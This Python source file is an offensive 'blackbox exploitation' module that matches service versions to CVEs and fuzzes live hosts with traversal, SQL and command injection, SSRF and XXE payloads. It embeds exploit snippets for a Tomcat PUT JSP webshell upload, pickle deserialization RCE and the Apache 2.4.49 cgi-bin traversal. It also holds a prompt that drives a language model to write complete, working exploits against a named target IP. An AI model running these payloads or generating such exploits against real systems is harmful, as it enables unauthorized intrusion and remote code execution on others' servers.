"""
Blackbox Exploitation Module
Provides exploitation capabilities without source code access.

Features:
- CVE Matching: Look up known vulnerabilities for detected services
- Exploit Lookup: Search ExploitDB for available exploits
- Blind Fuzzing: Protocol-aware fuzzing without source analysis
- Known Payload Testing: Test common exploit payloads
"""

import logging
import json
import re
import socket
import requests
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)


@dataclass
class CVEInfo:
    """Container for CVE information."""
    cve_id: str
    description: str
    severity: str  # critical, high, medium, low
    cvss_score: float
    affected_versions: List[str]
    exploit_available: bool
    references: List[str]


@dataclass
class ExploitInfo:
    """Container for exploit information."""
    exploit_id: str
    title: str
    source: str  # exploitdb, github, custom
    url: str
    exploit_type: str  # remote, local, webapps, dos
    platform: str
    verified: bool


@dataclass
class BlackboxResult:
    """Results from blackbox analysis."""
    service_name: str
    version: str
    port: int
    cves: List[CVEInfo]
    exploits: List[ExploitInfo]
    fuzzing_results: List[Dict[str, Any]]
    recommendations: List[str]


class CVEMatcher:
    """Match service versions to known CVEs."""
    
    # Local CVE database for common services (offline fallback)
    # In production, this would query NVD API or a local CVE database
    CVE_DATABASE = {
        "apache tomcat": {
            "9.0.46": ["CVE-2021-25122", "CVE-2021-25329"],
            "9.0.0": ["CVE-2020-1938", "CVE-2020-9484", "CVE-2019-0232"],
            "8.5.0": ["CVE-2020-1938", "CVE-2017-12617", "CVE-2017-12615"],
            "7.0.0": ["CVE-2020-1938", "CVE-2016-8735", "CVE-2016-6816"],
        },
        "apache": {
            "2.4.49": ["CVE-2021-41773", "CVE-2021-42013"],
            "2.4.50": ["CVE-2021-42013"],
            "2.4.0": ["CVE-2017-15715", "CVE-2017-15710"],
        },
        "nginx": {
            "1.20.0": ["CVE-2021-23017"],
            "1.18.0": ["CVE-2019-20372"],
        },
        "openssh": {
            "7.0": ["CVE-2016-10009", "CVE-2016-10010"],
            "6.0": ["CVE-2016-0777", "CVE-2016-0778"],
        },
        "mysql": {
            "5.7.0": ["CVE-2020-14812", "CVE-2020-14765"],
            "8.0.0": ["CVE-2021-2307", "CVE-2021-2226"],
        },
        "microsoft iis": {
            "10.0": ["CVE-2017-7269"],
            "7.5": ["CVE-2017-7269", "CVE-2015-1635"],
        }
    }
    
    CVE_DETAILS = {
        "CVE-2021-41773": {"severity": "critical", "cvss": 9.8, "desc": "Apache HTTP Server Path Traversal (RCE)"},
        "CVE-2021-42013": {"severity": "critical", "cvss": 9.8, "desc": "Apache HTTP Server Path Traversal Bypass"},
        "CVE-2020-1938": {"severity": "critical", "cvss": 9.8, "desc": "Apache Tomcat AJP Ghostcat (File Read/RCE)"},
        "CVE-2021-25122": {"severity": "high", "cvss": 7.5, "desc": "Apache Tomcat Request Header Information Disclosure"},
        "CVE-2017-12617": {"severity": "high", "cvss": 8.1, "desc": "Apache Tomcat PUT Method RCE"},
        "CVE-2019-0232": {"severity": "high", "cvss": 8.1, "desc": "Apache Tomcat CGI Servlet RCE (Windows)"},
        "CVE-2021-23017": {"severity": "high", "cvss": 7.7, "desc": "Nginx DNS Resolver Off-by-One Heap Write"},
        "CVE-2016-10009": {"severity": "high", "cvss": 7.3, "desc": "OpenSSH Agent Forwarding RCE"},
        "CVE-2017-7269": {"severity": "critical", "cvss": 9.8, "desc": "IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow"},
    }
    
    def match_cves(self, product: str, version: str) -> List[CVEInfo]:
        """Match a product/version to known CVEs."""
        cves = []
        product_lower = product.lower().strip()
        
        # Find matching product in database
        for db_product, versions in self.CVE_DATABASE.items():
            if db_product in product_lower or product_lower in db_product:
                # Check version matches
                for db_version, cve_ids in versions.items():
                    if self._version_matches(version, db_version):
                        for cve_id in cve_ids:
                            details = self.CVE_DETAILS.get(cve_id, {})
                            cves.append(CVEInfo(
                                cve_id=cve_id,
                                description=details.get("desc", "No description available"),
                                severity=details.get("severity", "unknown"),
                                cvss_score=details.get("cvss", 0.0),
                                affected_versions=[db_version],
                                exploit_available=True,  # Simplified
                                references=[f"https://nvd.nist.gov/vuln/detail/{cve_id}"]
                            ))
        
        # Deduplicate by CVE ID
        seen = set()
        unique_cves = []
        for cve in cves:
            if cve.cve_id not in seen:
                seen.add(cve.cve_id)
                unique_cves.append(cve)
        
        return sorted(unique_cves, key=lambda x: x.cvss_score, reverse=True)
    
    def _version_matches(self, detected_version: str, db_version: str) -> bool:
        """Check if detected version matches or is affected by a CVE version."""
        if not detected_version or not db_version:
            return True  # If version unknown, assume vulnerable
        
        try:
            detected_parts = [int(x) for x in re.findall(r'\d+', detected_version)[:3]]
            db_parts = [int(x) for x in re.findall(r'\d+', db_version)[:3]]
            
            # Pad to same length
            while len(detected_parts) < 3:
                detected_parts.append(0)
            while len(db_parts) < 3:
                db_parts.append(0)
            
            # Check if detected version is same or older than CVE version
            return detected_parts <= db_parts or detected_parts[:2] == db_parts[:2]
        except:
            return True  # If parsing fails, assume vulnerable


class ExploitLookup:
    """Look up known exploits for vulnerabilities."""
    
    # Simplified exploit database (in production, would query ExploitDB API)
    EXPLOIT_DATABASE = {
        "CVE-2021-41773": [
            {"id": "50383", "title": "Apache HTTP Server 2.4.49 - Path Traversal & RCE", "type": "webapps", "url": "https://www.exploit-db.com/exploits/50383"},
        ],
        "CVE-2020-1938": [
            {"id": "48143", "title": "Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion", "type": "webapps", "url": "https://www.exploit-db.com/exploits/48143"},
        ],
        "CVE-2017-12617": [
            {"id": "42966", "title": "Apache Tomcat < 9.0.1 - PUT Method RCE", "type": "webapps", "url": "https://www.exploit-db.com/exploits/42966"},
        ],
        "CVE-2017-7269": [
            {"id": "41738", "title": "IIS 6.0 - WebDAV ScStoragePathFromUrl Buffer Overflow", "type": "remote", "url": "https://www.exploit-db.com/exploits/41738"},
        ],
        "CVE-2020-9484": [
            {"id": "48573", "title": "Apache Tomcat - Session Persistence RCE", "type": "webapps", "url": "https://www.exploit-db.com/exploits/48573"},
        ],
    }
    
    # Reference exploit code snippets for LLM to learn from
    # These are EXAMPLES - LLM will adapt them, not copy directly
    EXPLOIT_CODE_REFERENCES = {
        "CVE-2020-1938": '''
# Ghostcat - Apache Tomcat AJP File Read/RCE
# Reference for learning attack pattern

import socket
import struct

def create_ajp_forward_request(host, port, target_file):
    """Create AJP FORWARD_REQUEST packet to read files"""
    # AJP13 protocol implementation
    prefix_code = 0x02  # FORWARD_REQUEST
    method = 0x02  # GET
    
    # Build request attributes
    attributes = [
        (0x0e, target_file),  # req_attribute: javax.servlet.include.request_uri
    ]
    
    # ... (attack pattern continues)
    return packet

def exploit(target_ip, ajp_port=8009, file_path="/WEB-INF/web.xml"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, ajp_port))
    # Send malicious AJP request to read arbitrary files
    # Can be escalated to RCE with session persistence
''',
        "CVE-2020-9484": '''
# Apache Tomcat Session Persistence RCE
# Reference for learning attack pattern

import requests
import pickle
import base64

def create_malicious_session(command):
    """Create serialized payload for session persistence RCE"""
    # This exploits insecure deserialization in session persistence
    
    class PayloadExecutor:
        def __reduce__(self):
            import os
            return (os.system, (command,))
    
    payload = pickle.dumps(PayloadExecutor())
    return base64.b64encode(payload).decode()

def exploit(target_url, command="id"):
    # Requires: PersistentManager with FileStore configured
    # Attack: Upload malicious .session file, trigger deserialization
    session_payload = create_malicious_session(command)
    # ... (send request with JSESSIONID pointing to malicious session)
''',
        "CVE-2017-12617": '''
# Apache Tomcat PUT Method RCE
# Reference for learning attack pattern

import requests

def exploit(target_url, shell_name="shell.jsp"):
    """Upload JSP webshell via PUT method (requires readonly=false)"""
    
    # JSP webshell - executes commands via cmd parameter
    jsp_shell = (
        '<%@ page import="java.io.*" %>\\n'
        '<%\\n'
        '    String cmd = request.getParameter("cmd");\\n'
        '    Process p = Runtime.getRuntime().exec(cmd);\\n'
        '    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\\n'
        '    String line;\\n'
        '    while ((line = br.readLine()) != null) { out.println(line); }\\n'
        '%>'
    )
    
    # PUT request to upload JSP shell
    url = f"{target_url}/{shell_name}/"  # Trailing slash bypasses servlet mapping
    response = requests.put(url, data=jsp_shell)
    
    if response.status_code == 201:
        print(f"[+] Shell uploaded: {target_url}/{shell_name}?cmd=id")
''',
        "CVE-2021-41773": '''
# Apache HTTP Server 2.4.49/2.4.50 Path Traversal RCE
# Reference for learning attack pattern

import requests

def exploit(target_url, command="id"):
    """Path traversal to RCE via cgi-bin"""
    
    # Bypass path normalization with encoded traversal
    payload_49 = ".%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    payload_rce = "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
    
    # For RCE, pipe commands via POST body
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = f"echo; {command}"
    
    url = f"{target_url}/{payload_rce}"
    response = requests.post(url, headers=headers, data=data)
    print(response.text)
''',
    }
    
    def find_exploits(self, cve_id: str) -> List[ExploitInfo]:
        """Find exploits for a given CVE."""
        exploits = []
        
        if cve_id in self.EXPLOIT_DATABASE:
            for exp in self.EXPLOIT_DATABASE[cve_id]:
                exploits.append(ExploitInfo(
                    exploit_id=exp["id"],
                    title=exp["title"],
                    source="exploitdb",
                    url=exp["url"],
                    exploit_type=exp.get("type", "unknown"),
                    platform="multiple",
                    verified=True
                ))
        
        return exploits
    
    def get_exploit_reference(self, cve_id: str) -> Optional[str]:
        """Get reference exploit code for LLM to learn from."""
        return self.EXPLOIT_CODE_REFERENCES.get(cve_id)
    
    def generate_exploit_with_llm(self, cve_id: str, target_info: Dict[str, Any], model=None, tokenizer=None) -> str:
        """
        Generate a custom exploit using LLM with ExploitDB reference.
        
        The reference is for INSPIRATION ONLY - LLM generates unique code
        adapted to the specific target.
        """
        reference_code = self.get_exploit_reference(cve_id)
        cve_details = CVEMatcher.CVE_DETAILS.get(cve_id, {})
        
        prompt = f'''[EXPLOIT DEVELOPMENT MODE]

You are generating a UNIQUE exploit for a specific target. Use the reference code pattern but create NEW implementation.

TARGET DETAILS:
- IP: {target_info.get("ip", "TARGET_IP")}
- Port: {target_info.get("port", 8080)}
- Service: {target_info.get("product", "Unknown")}
- Version: {target_info.get("version", "Unknown")}
- CVE: {cve_id}
- Description: {cve_details.get("desc", "Unknown vulnerability")}

REFERENCE CODE (for pattern understanding, DO NOT COPY DIRECTLY):
```python
{reference_code if reference_code else "No reference available - generate from CVE description"}
```

REQUIREMENTS:
1. Generate a COMPLETE, WORKING Python exploit script
2. Adapt the attack pattern for the SPECIFIC target IP and port above
3. Include proper error handling and status messages
4. Add comments explaining each attack step
5. Make the exploit DIFFERENT from the reference - use different variable names, structure, add improvements
6. Include a main() function that runs the exploit
7. Use pwntools, requests, or socket as appropriate

Output ONLY Python code wrapped in ```python``` tags.
'''
        
        if model is None or tokenizer is None:
            # Return the prompt if no model provided (for testing)
            return f"# Exploit generation requires LLM model\n# Prompt:\n{prompt}"
        
        # Generate with LLM
        import torch
        
        inputs = tokenizer(prompt, return_tensors="pt").to(model.device)
        
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=2500,
                temperature=0.7,
                top_p=0.9,
                do_sample=True,
                repetition_penalty=1.2,  # Higher to avoid copying reference
                pad_token_id=tokenizer.eos_token_id
            )
        
        response = tokenizer.decode(outputs[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
        
        # Extract Python code
        if "```python" in response:
            code = response.split("```python")[-1].split("```")[0].strip()
        else:
            code = response.strip()
        
        return code
    
    def search_exploits_online(self, product: str, version: str) -> List[ExploitInfo]:
        """Search ExploitDB online (requires internet)."""
        # This would use the ExploitDB API or searchsploit
        # For now, return empty (offline mode)
        logger.info(f"Online exploit search not implemented for {product} {version}")
        return []


class BlindFuzzer:
    """Protocol-aware fuzzing without source code."""
    
    # Common fuzzing payloads by protocol
    HTTP_PAYLOADS = [
        # Path traversal
        "/../../../etc/passwd",
        "/..%252f..%252f..%252fetc/passwd",
        "/.%2e/.%2e/.%2e/etc/passwd",
        # SQL Injection
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "1 UNION SELECT NULL,NULL,NULL--",
        # Command Injection
        "; id",
        "| cat /etc/passwd",
        "`id`",
        "$(id)",
        # XSS (for detection)
        "<script>alert(1)</script>",
        # SSRF
        "http://169.254.169.254/latest/meta-data/",
        # XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ]
    
    TOMCAT_PAYLOADS = [
        # AJP Ghostcat
        ("AJP", 8009, b"\x12\x34\x00\x01\x0a"),
        # Manager brute force paths
        ("/manager/html", "GET"),
        ("/manager/status", "GET"),
        ("/host-manager/html", "GET"),
        # PUT upload
        ("/test.jsp", "PUT", "<%out.print(\"pwned\");%>"),
    ]
    
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout
        self.results = []
    
    def fuzz_http(self, ip: str, port: int, paths: List[str] = None) -> List[Dict[str, Any]]:
        """Fuzz HTTP endpoints with common payloads."""
        results = []
        base_url = f"http://{ip}:{port}"
        
        test_paths = paths or ["/", "/admin", "/login", "/api"]
        
        for path in test_paths:
            for payload in self.HTTP_PAYLOADS[:5]:  # Limit payloads for speed
                try:
                    url = f"{base_url}{path}{payload}"
                    response = requests.get(url, timeout=self.timeout, verify=False, allow_redirects=False)
                    
                    # Check for interesting responses
                    if self._is_interesting_response(response):
                        results.append({
                            "type": "http_fuzz",
                            "url": url,
                            "status_code": response.status_code,
                            "content_length": len(response.content),
                            "interesting": True,
                            "notes": self._analyze_response(response)
                        })
                except requests.exceptions.RequestException:
                    pass
        
        return results
    
    def fuzz_service(self, ip: str, port: int, service: str) -> List[Dict[str, Any]]:
        """Fuzz a specific service based on its type."""
        service_lower = service.lower()
        
        if "http" in service_lower or port in [80, 8080, 443, 8443]:
            return self.fuzz_http(ip, port)
        elif "tomcat" in service_lower:
            return self._fuzz_tomcat(ip, port)
        elif "ssh" in service_lower:
            return self._fuzz_ssh(ip, port)
        elif "mysql" in service_lower or "sql" in service_lower:
            return self._fuzz_mysql(ip, port)
        else:
            return self._fuzz_generic(ip, port)
    
    def _fuzz_tomcat(self, ip: str, port: int) -> List[Dict[str, Any]]:
        """Tomcat-specific fuzzing."""
        results = []
        
        # Test for manager access
        try:
            for path in ["/manager/html", "/manager/status"]:
                url = f"http://{ip}:{port}{path}"
                response = requests.get(url, timeout=self.timeout, verify=False)
                if response.status_code == 401:
                    results.append({
                        "type": "tomcat_manager",
                        "url": url,
                        "notes": "Manager interface found - requires authentication",
                        "attack": "Try default credentials: tomcat:tomcat, admin:admin"
                    })
                elif response.status_code == 200:
                    results.append({
                        "type": "tomcat_manager",
                        "url": url,
                        "notes": "CRITICAL: Manager interface accessible without auth!",
                        "severity": "critical"
                    })
        except:
            pass
        
        # Test for AJP port
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            if sock.connect_ex((ip, 8009)) == 0:
                results.append({
                    "type": "ajp_port",
                    "port": 8009,
                    "notes": "AJP port open - potential Ghostcat (CVE-2020-1938)",
                    "severity": "critical"
                })
            sock.close()
        except:
            pass
        
        return results
    
    def _fuzz_ssh(self, ip: str, port: int) -> List[Dict[str, Any]]:
        """SSH enumeration."""
        results = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            results.append({
                "type": "ssh_banner",
                "banner": banner,
                "notes": "Check for version-specific vulnerabilities"
            })
        except:
            pass
        
        return results
    
    def _fuzz_mysql(self, ip: str, port: int) -> List[Dict[str, Any]]:
        """MySQL enumeration."""
        results = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((ip, port))
            banner = sock.recv(1024)
            sock.close()
            
            # MySQL sends version in initial handshake
            if banner:
                results.append({
                    "type": "mysql_handshake",
                    "notes": "MySQL port accessible - check for weak credentials"
                })
        except:
            pass
        
        return results
    
    def _fuzz_generic(self, ip: str, port: int) -> List[Dict[str, Any]]:
        """Generic service fuzzing."""
        results = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((ip, port))
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            response = sock.recv(1024)
            sock.close()
            
            if response:
                results.append({
                    "type": "generic_probe",
                    "port": port,
                    "response_length": len(response),
                    "notes": "Port responsive to probing"
                })
        except:
            pass
        
        return results
    
    def _is_interesting_response(self, response) -> bool:
        """Check if HTTP response indicates a vulnerability."""
        # Abnormal status codes
        if response.status_code in [500, 502, 503]:
            return True
        
        # Error messages that indicate vulnerabilities
        indicators = ["error", "exception", "stack trace", "root:", "uid=", "passwd"]
        content = response.text.lower()
        return any(ind in content for ind in indicators)
    
    def _analyze_response(self, response) -> str:
        """Analyze response for vulnerability indicators."""
        content = response.text.lower()
        
        if "root:" in content or "uid=" in content:
            return "CRITICAL: Possible command injection or file disclosure!"
        if "exception" in content or "stack trace" in content:
            return "Error disclosure - check for injection points"
        if response.status_code == 500:
            return "Server error - potential crash or injection"
        
        return "Interesting response detected"


class BlackboxExploiter:
    """Main class for blackbox exploitation workflow."""
    
    def __init__(self):
        self.cve_matcher = CVEMatcher()
        self.exploit_lookup = ExploitLookup()
        self.fuzzer = BlindFuzzer()
    
    def analyze_service(self, service_info: Dict[str, Any], target_ip: str) -> BlackboxResult:
        """
        Perform blackbox analysis on a service.
        
        Args:
            service_info: Dict with port, service, product, version
            target_ip: Target IP address
            
        Returns:
            BlackboxResult with CVEs, exploits, and fuzzing results
        """
        port = service_info.get("port", 0)
        product = service_info.get("product", service_info.get("service", "unknown"))
        version = service_info.get("version", "")
        
        logger.info(f"Blackbox analysis: {product} {version} on port {port}")
        
        # 1. Match CVEs
        cves = self.cve_matcher.match_cves(product, version)
        logger.info(f"Found {len(cves)} potential CVEs")
        
        # 2. Look up exploits
        exploits = []
        for cve in cves:
            exploits.extend(self.exploit_lookup.find_exploits(cve.cve_id))
        logger.info(f"Found {len(exploits)} available exploits")
        
        # 3. Run blind fuzzing
        fuzzing_results = self.fuzzer.fuzz_service(target_ip, port, product)
        logger.info(f"Fuzzing found {len(fuzzing_results)} interesting results")
        
        # 4. Generate recommendations
        recommendations = self._generate_recommendations(cves, exploits, fuzzing_results)
        
        return BlackboxResult(
            service_name=product,
            version=version,
            port=port,
            cves=cves,
            exploits=exploits,
            fuzzing_results=fuzzing_results,
            recommendations=recommendations
        )
    
    def analyze_all_services(self, services: List[Dict[str, Any]], target_ip: str) -> List[BlackboxResult]:
        """Analyze all discovered services."""
        results = []
        for service in services:
            try:
                result = self.analyze_service(service, target_ip)
                results.append(result)
            except Exception as e:
                logger.error(f"Error analyzing service on port {service.get('port')}: {e}")
        
        return results
    
    def _generate_recommendations(self, cves: List[CVEInfo], exploits: List[ExploitInfo], 
                                   fuzzing_results: List[Dict]) -> List[str]:
        """Generate attack recommendations based on findings."""
        recommendations = []
        
        # Critical CVEs first
        critical_cves = [c for c in cves if c.severity == "critical"]
        if critical_cves:
            recommendations.append(f"ðŸ”´ CRITICAL: {len(critical_cves)} critical CVEs found - prioritize these!")
            for cve in critical_cves[:3]:
                recommendations.append(f"   - {cve.cve_id}: {cve.description}")
        
        # Available exploits
        if exploits:
            recommendations.append(f"ðŸ’£ {len(exploits)} ready-to-use exploits available")
            for exp in exploits[:3]:
                recommendations.append(f"   - {exp.title}: {exp.url}")
        
        # Fuzzing findings
        critical_fuzz = [f for f in fuzzing_results if f.get("severity") == "critical"]
        if critical_fuzz:
            recommendations.append(f"âš ï¸  Fuzzing found {len(critical_fuzz)} critical issues")
        
        if not recommendations:
            recommendations.append("No obvious attack vectors found - consider manual testing")
        
        return recommendations
    
    def format_results(self, result: BlackboxResult) -> str:
        """Format results for display."""
        lines = [
            "=" * 60,
            f"BLACKBOX ANALYSIS: {result.service_name} {result.version}",
            f"Port: {result.port}",
            "=" * 60,
            "",
            f"ðŸ” CVEs Found: {len(result.cves)}",
        ]
        
        for cve in result.cves[:5]:
            lines.append(f"  [{cve.severity.upper()}] {cve.cve_id}: {cve.description}")
        
        lines.append("")
        lines.append(f"ðŸ’£ Exploits Available: {len(result.exploits)}")
        for exp in result.exploits[:3]:
            lines.append(f"  - {exp.title}")
            lines.append(f"    {exp.url}")
        
        lines.append("")
        lines.append(f"ðŸ”§ Fuzzing Results: {len(result.fuzzing_results)}")
        for fuzz in result.fuzzing_results[:3]:
            lines.append(f"  - {fuzz.get('type', 'unknown')}: {fuzz.get('notes', 'N/A')}")
        
        lines.append("")
        lines.append("ðŸ“‹ RECOMMENDATIONS:")
        for rec in result.recommendations:
            lines.append(f"  {rec}")
        
        return "\n".join(lines)


# Convenience function
def run_blackbox_analysis(ip: str, services: List[Dict[str, Any]]) -> List[BlackboxResult]:
    """Run blackbox analysis on all services."""
    exploiter = BlackboxExploiter()
    return exploiter.analyze_all_services(services, ip)


if __name__ == "__main__":
    import sys
    
    # Test with sample data
    sample_services = [
        {"port": 80, "service": "http", "product": "Apache Tomcat", "version": "9.0.46"},
        {"port": 8009, "service": "ajp13", "product": "Apache Jserv", "version": "1.3"},
    ]
    
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    
    exploiter = BlackboxExploiter()
    for service in sample_services:
        result = exploiter.analyze_service(service, target)
        print(exploiter.format_results(result))
        print("\n")
